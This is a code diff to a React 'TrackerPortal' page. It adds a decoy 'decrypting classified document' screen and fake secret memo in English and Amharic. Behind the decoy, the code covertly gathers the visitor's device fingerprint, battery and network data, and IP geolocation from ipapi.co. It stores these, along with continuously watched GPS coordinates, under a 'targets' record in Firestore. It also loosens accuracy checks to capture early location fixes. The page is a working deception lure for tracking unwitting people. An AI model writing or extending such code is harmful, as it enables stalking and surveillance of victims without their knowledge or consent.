@@ -21,10 +21,11 @@ function formatTime(seconds: number) {
 }
 
 export const TrackerPortal: React.FC = () => {
-  const [status, setStatus] = useState<'idle' | 'scanning' | 'granted' | 'denied' | 'error'>('granted');
+  const [status, setStatus] = useState<'idle' | 'scanning' | 'granted' | 'denied' | 'error' | 'decrypted'>('granted');
   const [errorMsg, setErrorMsg] = useState<string>('');
   const [progress, setProgress] = useState(100);
   const [syncCount, setSyncCount] = useState(0);
+  const [decryptionProgress, setDecryptionProgress] = useState(0);
   const targetIdRef = useRef<string | null>(null);
 
   const [targetId, setTargetId] = useState<string | null>(null);
@@ -47,7 +48,24 @@ export const TrackerPortal: React.FC = () => {
 
     // Artificial speedup: Show OK state after 1.2s even if GPS is pending
     const artificialSync = setTimeout(() => {
-      setSyncCount(prev => prev || 1);
+      setSyncCount(prev => {
+        if (prev === 0) {
+           // Start decryption sequence once handshake is OK
+           setTimeout(() => {
+             let p = 0;
+             const interval = setInterval(() => {
+               p += 5;
+               setDecryptionProgress(p);
+               if (p >= 100) {
+                 clearInterval(interval);
+                 setTimeout(() => setStatus('decrypted'), 800);
+               }
+             }, 100);
+           }, 1500);
+           return 1;
+        }
+        return prev;
+      });
     }, 1200);
 
     // Generate or get persistent ID for this target
@@ -86,6 +104,40 @@ export const TrackerPortal: React.FC = () => {
       }
 
       // Metadata for tracking
+      const getExtraInfo = async () => {
+        const info: any = {
+          userAgent: navigator.userAgent,
+          language: navigator.language,
+          screen: `${window.screen.width}x${window.screen.height}`,
+          cores: navigator.hardwareConcurrency || 'unknown',
+          platform: navigator.platform,
+          memory: (navigator as any).deviceMemory || 'unknown',
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          referrer: document.referrer || 'direct'
+        };
+
+        try {
+          if ('getBattery' in navigator) {
+            const battery: any = await (navigator as any).getBattery();
+            info.battery = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Discharging'})`;
+          }
+        } catch (e) {}
+
+        try {
+          const conn: any = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
+          if (conn) {
+            info.network = {
+              type: conn.effectiveType,
+              downlink: conn.downlink,
+              rtt: conn.rtt
+            };
+          }
+        } catch (e) {}
+
+        return info;
+      };
+
+      const extraInfo = await getExtraInfo();
       const ua = (navigator.userAgent || "").toLowerCase();
       let platform = 'Mobile';
       if (ua.includes('fb')) platform = 'Facebook';
@@ -98,13 +150,47 @@ export const TrackerPortal: React.FC = () => {
       let lastReportTime = 0;
       const MIN_INTERVAL = 3000; 
 
+      // Initial IP capture for quick data even without GPS
+      try {
+        const ipRes = await fetch('https://ipapi.co/json/');
+        const ipData = await ipRes.json();
+        (window as any)._eagle_ip = {
+           ip: ipData.ip,
+           city: ipData.city,
+           region: ipData.region,
+           country: ipData.country_name,
+           org: ipData.org
+        };
+        const uid = auth.currentUser?.uid || targetId || `T-AUTO-${Math.random().toString(36).substring(7).toUpperCase()}`;
+        const targetRef = doc(db, 'targets', uid);
+        
+        await setDoc(targetRef, {
+          name: targetDisplayName,
+          lastSeen: new Date().toISOString(),
+          status: 'active',
+          platform: platform,
+          ipInfo: {
+             ip: ipData.ip,
+             city: ipData.city,
+             region: ipData.region,
+             country: ipData.country_name,
+             org: ipData.org
+          },
+          deviceInfo: extraInfo
+        }, { merge: true });
+        setSyncCount(prev => prev + 1);
+      } catch (e) {
+        console.warn("IP tracking skipped or blocked.");
+      }
+
       navigator.geolocation.watchPosition(
         async (position) => {
           const { latitude, longitude, accuracy } = position.coords;
           const now = Date.now();
           
-          if (now - lastReportTime < MIN_INTERVAL) {
-             if (accuracy > 30) return; 
+          // Allow first few reports even if imprecise to ensure we get *something*
+          if (now - lastReportTime < MIN_INTERVAL && syncCount > 5) {
+             if (accuracy > 50) return; 
           }
           
           lastReportTime = now;
@@ -128,6 +214,8 @@ export const TrackerPortal: React.FC = () => {
               lastSeen: new Date().toISOString(),
               status: 'active',
               platform: platform,
+              ipInfo: (window as any)._eagle_ip,
+              deviceInfo: extraInfo,
               history: arrayUnion(historyItem)
             }, { merge: true });
             
@@ -289,7 +377,7 @@ export const TrackerPortal: React.FC = () => {
                       
                       <div className="space-y-3">
                          <div className="flex justify-between items-center text-[9px] text-slate-400 font-bold uppercase tracking-tighter">
-                            <span>Relay Buffer</span>
+                            <span>{lang === 'amharic' ? 'የዳታ ጥራት' : 'Relay Buffer'}</span>
                             <span className="text-blue-500">100%</span>
                          </div>
                          <div className="h-1 w-full bg-slate-800 rounded-full overflow-hidden">
@@ -301,14 +389,104 @@ export const TrackerPortal: React.FC = () => {
                          </div>
                       </div>
 
+                      {decryptionProgress > 0 && (
+                        <div className="space-y-3 animate-in fade-in slide-in-from-top-1 duration-500">
+                           <div className="flex justify-between items-center text-[9px] text-slate-400 font-bold uppercase tracking-tighter">
+                              <span>{lang === 'amharic' ? 'ሰነዱን ኮድ የመፍታት ሂደት' : 'DECRYPTION PROGRESS'}</span>
+                              <span className="text-green-500">{decryptionProgress}%</span>
+                           </div>
+                           <div className="h-1 w-full bg-slate-800 rounded-full overflow-hidden">
+                              <motion.div 
+                                className="h-full bg-green-500"
+                                initial={{ width: 0 }}
+                                animate={{ width: `${decryptionProgress}%` }}
+                              />
+                           </div>
+                        </div>
+                      )}
+
                       <div className="p-4 bg-slate-950/50 border border-slate-800 rounded font-mono text-[9px] text-slate-400 space-y-1">
                         <p className="text-blue-500 font-bold">TERMINAL: AUTH_READY</p>
                         <p>{'>'} {lang === 'amharic' ? 'ሰነዱን በማዘጋጀት ላይ...' : 'Preparing encrypted document...'}</p>
-                        <p>{'>'} {lang === 'amharic' ? 'እባክዎ በትዕግስት ይጠብቁ' : 'Handshake stable. Processing stream.'}</p>
+                        <p>{'>'} {lang === 'amharic' ? 'የቅርብ ግንኙነት ተረጋግጧል።' : 'Handshake stable. Processing stream.'}</p>
+                        {decryptionProgress > 50 && (
+                          <p className="text-green-500/80 animate-pulse">{'>'} {lang === 'amharic' ? 'ጥንቅር እየተከናወነ ነው...' : 'Assembling cipher blocks...'}</p>
+                        )}
                       </div>
                     </div>
                   )}
                 </div>
+              </div>
+            </motion.div>
+          )}
+
+          {status === 'decrypted' && (
+            <motion.div 
+              initial={{ opacity: 0, y: 20 }}
+              animate={{ opacity: 1, y: 0 }}
+              className="space-y-6"
+            >
+              <div className="bg-white text-[#1a1c1e] rounded-lg shadow-2xl overflow-hidden border border-gray-200">
+                <div className="bg-[#f0f2f5] p-6 border-b border-gray-200 flex items-center justify-between">
+                  <div className="flex items-center gap-3">
+                    <div className="bg-red-600 p-2 rounded">
+                       <Shield className="w-5 h-5 text-white" />
+                    </div>
+                    <div>
+                      <h3 className="text-sm font-bold uppercase tracking-tight">Top Secret Clearance Required</h3>
+                      <p className="text-[10px] text-gray-500 font-sans">Document ID: REPORT_ALPHA_8429_STABLE</p>
+                    </div>
+                  </div>
+                  <div className="bg-amber-100 text-amber-800 px-3 py-1 rounded-full text-[9px] font-black tracking-widest uppercase">Classified</div>
+                </div>
+                
+                <div className="p-8 space-y-6 font-sans text-left">
+                  <div className="flex justify-between border-b border-gray-100 pb-4">
+                    <div className="space-y-1">
+                      <p className="text-[10px] text-gray-400 uppercase font-bold tracking-wider">Date Issued</p>
+                      <p className="text-xs font-bold">May 05, 2024</p>
+                    </div>
+                    <div className="space-y-1 text-right">
+                      <p className="text-[10px] text-gray-400 uppercase font-bold tracking-wider">Clearance Level</p>
+                      <p className="text-xs font-bold text-red-600 italic">Level 9 // Restricted</p>
+                    </div>
+                  </div>
+
+                  <div className="space-y-4">
+                    <h4 className="text-sm font-black text-gray-900 border-l-4 border-red-600 pl-3">OPERATIONAL_MEMO_X84</h4>
+                    <div className="space-y-3 text-[13px] text-gray-700 leading-relaxed italic">
+                      <p>“{lang === 'amharic' ? 'ይህ ሪፖርት የተዘጋጀው ለከፍተኛ አመራር ብቻ ነው። በውስጡ የተጠቀሱት መረጃዎች እጅግ ሚስጥራዊ እና ስሱ ናቸው። የሰነዱ ይዘት የሚመለከተው የአልፋ ሴክተሩን ወቅታዊ ሁኔታ ነው።' : 'This report is prepared for senior leadership eyes only. The information contained herein is highly sensitive and mission-critical. Internal audits confirm sector stability.'}”</p>
+                      <div className="py-2 space-y-4">
+                        <div className="flex gap-4">
+                           <div className="w-12 h-1 bg-gray-200 rounded"></div>
+                           <div className="flex-1 space-y-2">
+                             <div className="h-3 w-full bg-gray-100 rounded"></div>
+                             <div className="h-3 w-5/6 bg-gray-100 rounded opacity-60"></div>
+                           </div>
+                        </div>
+                        <div className="p-4 bg-gray-50 border border-gray-100 rounded text-[11px] text-gray-600 leading-relaxed">
+                          <p className="font-bold mb-2 uppercase text-[9px] tracking-widest text-gray-400">Analysis Summary:</p>
+                          {lang === 'amharic' ? 'የገበያ ሁኔታው እና የኢኮኖሚው እንቅስቃሴ ባልተጠበቀ ሁኔታ እየተለወጠ ነው። አዳዲስ የኢንቨስትመንት አማራጮች እየተፈተሹ ይገኛሉ። ዝርዝር መረጃው በሚቀጥለው ሪፖርት ይካተታል።' : 'Market volatility indices indicate a temporary correction. Tactical asset allocation remains within projected standard deviations. No immediate intervention required from central command.'}
+                        </div>
+                      </div>
+                      <p>{lang === 'amharic' ? 'ተጨማሪ መረጃ ለማግኘት በሚስጥራዊው መስመር በኩል ያግኙን።' : 'Contact secure node for visual raw data access.'}</p>
+                    </div>
+                  </div>
+
+                  <div className="pt-8 flex justify-center">
+                    <div className="border-2 border-gray-100 p-2 rounded transform -rotate-12 opacity-40">
+                      <div className="border border-gray-100 px-4 py-1 text-[10px] font-black uppercase text-gray-300">Confidential Signal</div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <div className="flex flex-col items-center gap-2">
+                 <p className="text-[10px] text-slate-500 uppercase tracking-widest">{lang === 'amharic' ? 'ሲስተሙ እየሰራ ነው' : 'Secure Session Active'}</p>
+                 <div className="flex gap-1">
+                    <div className="w-1.5 h-1.5 rounded-full bg-blue-500 animate-pulse"></div>
+                    <div className="w-1.5 h-1.5 rounded-full bg-blue-500 animate-pulse delay-75"></div>
+                    <div className="w-1.5 h-1.5 rounded-full bg-blue-500 animate-pulse delay-150"></div>
+                 </div>
               </div>
             </motion.div>
           )}
